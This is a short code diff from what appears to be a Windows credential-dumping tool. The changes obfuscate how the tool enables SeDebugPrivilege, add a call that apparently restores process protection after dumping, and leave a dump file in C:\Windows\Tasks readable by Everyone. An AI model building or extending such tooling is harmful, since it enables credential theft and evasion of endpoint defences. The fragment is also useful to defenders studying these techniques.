@@ -21,7 +21,7 @@ int main(void)
     }
 
     // Get SeDebugPrivilege
-    if (!EnableSEDBGPRV()) {
+    if (!EnableENCPVG(SE_DEBUG_ENC)) {
         log_error("Failed to acquire needed privileges.");
         // return 1;
     }
@@ -60,6 +60,8 @@ int main(void)
         return 1;
     }
 
+    restorePPL();
+
     // Set GENERIC_READ permissions to "Everyone"
     if (!SetFileGenericReadAccess("C:\\Windows\\Tasks\\doppelganger.dmp")) {
         log_error("Could not set GENERIC_READ permissions for Everyone.");
@@ -71,5 +73,6 @@ int main(void)
     // Done
     log_info("Execution completed successfully.");
     fclose(logfile);
+
     return 0;
 }
